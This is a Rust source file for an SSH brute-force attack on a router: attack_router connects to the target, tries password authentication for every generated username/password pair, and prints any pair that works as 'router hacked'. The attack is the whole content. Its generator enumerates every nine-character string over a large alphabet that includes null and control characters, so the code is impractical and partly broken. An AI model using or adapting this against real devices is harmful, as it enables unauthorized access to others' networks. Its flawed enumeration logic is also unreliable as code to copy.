use std::net::TcpStream;
use ssh2::Session;

pub fn attack_router(router: &String) {
    println!("\x1b[93mHacking router...\x1b[0m");

    let mut alphabet = gen::gen_alpha();

    let usernames = gen::gen_user(&alphabet);

    for i in 0..10 {
        alphabet.push(char::from(i));
    }
    let passwords = gen::gen_pass(&alphabet);

    for uname in usernames {
        for pword in &passwords {
            let tcp = TcpStream::connect(&router).unwrap();
            let mut sess = Session::new().unwrap();
            sess.set_tcp_stream(tcp);
            sess.handshake().unwrap();

            let did_it_work = sess.userauth_password(&uname, &pword);

            if let Ok(_) = did_it_work {
                println!("\x1b[93mrouter hacked: {}/{}\x1b[0m", &uname, &pword);
            }
        }
    }
}

pub mod gen {
    pub fn gen_alpha() -> Vec<char> {
        let mut alphabet: Vec<char> = vec!['\0'];
        let mut alphabet1 = (b'a'..=b'z')
            .map(|c| c as char)
            .filter(|c| c.is_alphabetic())
            .collect::<Vec<char>>();
        let alphabet2 = (b'A'..=b'Z')
            .map(|c| c as char)
            .filter(|c| c.is_alphabetic())
            .collect::<Vec<char>>();
        for i in alphabet2 {
            alphabet1.push(i);
        }
        for i in alphabet1 {
            alphabet.push(i)
        }
        let symbols: Vec<char> = vec!['@', '!', '#', '$', '%', '&', '*','_', '-'];
        for i in symbols {
            alphabet.push(i);
        }
        let numerals: Vec<char> = vec!['1','2','3','4','5','6','7','8','9',];
        /* for some reason, one cannot use char::from(intager), so I'm just using
        an array. It aint pretty, but it works. */
        for i in numerals {
            alphabet.push(i);
        }
        return alphabet;
    }

    pub fn gen_user(chars: &Vec<char>) -> Vec<String> {

        let mut usernames: Vec<String> = Vec::new();

        for a in chars {
        for b in chars {
        for c in chars {
        for d in chars {
        for e in chars {
        for f in chars {
        for g in chars {
        for h in chars {
        for i in chars {
            let user = format!("{}{}{}{}{}{}{}{}{}", a,b,c,d,e,f,g,h,i);
            usernames.push(user);
        }}}}}}}}}

        return usernames;
    }

    pub fn gen_pass(chars: &Vec<char>) -> Vec<String> {
        /*
        for i in 0..10 {
            chars.push(char::from(i));
        }

        */

        let mut passwords: Vec<String> = Vec::new();

        for a in chars {
        for b in chars {
        for c in chars {
        for d in chars {
        for e in chars {
        for f in chars {
        for g in chars {
        for h in chars {
        for i in chars {
            let user = format!("{}{}{}{}{}{}{}{}{}", a,b,c,d,e,f,g,h,i);
            passwords.push(user);
        }}}}}}}}}

        return passwords;
    }
}
